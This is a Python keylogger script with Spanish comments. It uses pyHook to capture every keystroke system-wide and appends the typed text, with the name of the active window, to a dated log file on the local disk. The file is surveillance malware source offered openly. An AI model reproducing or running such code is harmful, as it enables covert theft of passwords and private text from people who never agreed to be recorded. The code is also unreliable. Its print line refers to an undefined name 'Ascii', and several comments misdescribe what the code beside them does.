import pyHook, pythoncom
from datetime import datetime

todays_date = datetime.now().strftime('%Y-%b-%d')
file_name = 'D:\\Documents\\Programming\\Python\\Keylogger\\Logs\\' + todays_date + '.txt'

line_buffer = "" #Linea en la cual se ejecutan una oracion
window_name = "" #Página actual

def SaveLineToFile(line):
    todays_file = open(file_name, 'a') #Abre e archivo (append mode)
    todays_file.write(line) #Ingresa una linea de texto
    todays_file.close() #Cierra el archivo

def OnKeyboardEvent(event):
    global line_buffer
    global window_name

    print (Ascii, event.Ascii, chr(event.Ascii)) 

   
    if(window_name != event.WindowName): #Si llega a escribir en la nueva pagina
        if(line_buffer != ""): #Si la linea está vacia
            line_buffer += '\n'
            SaveLineToFile(line_buffer) #Imprimir: Ventana que se cierra

        line_buffer = "" 
        SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n') #Imprimir: nuevo nombre de la ventana
        window_name = event.WindowName 

    if(event.Ascii == 13 or event.Ascii == 9): #regresar tecla
        line_buffer += '\n'
        SaveLineToFile(line_buffer) #Imprimir: Nombre de la tecla en texto
        line_buffer = "" #Si presiona borrar
        return True #Cerrar evento

    if(event.Ascii == 8): #Borrar
        line_buffer = line_buffer[:-1] #Imprime el caracter borrado
        return True #Sale del evento

    if(event.Ascii < 32 or event.Ascii > 126):
        if(event.Ascii == 0): 
             pass #No hace nada
        else:
            line_buffer = line_buffer + '\n' + str(event.Ascii) + '\n'
    else:
        line_buffer += chr(event.Ascii)
        
    return True

hooks_manager = pyHook.HookManager() #Obtiene un nuevo hook
hooks_manager.KeyDown = OnKeyboardEvent #Los caracteres presionados
hooks_manager.HookKeyboard() #Marca, modelos, tipo, y orden del teclado
pythoncom.PumpMessages() #Envia el mensaje de los eventos
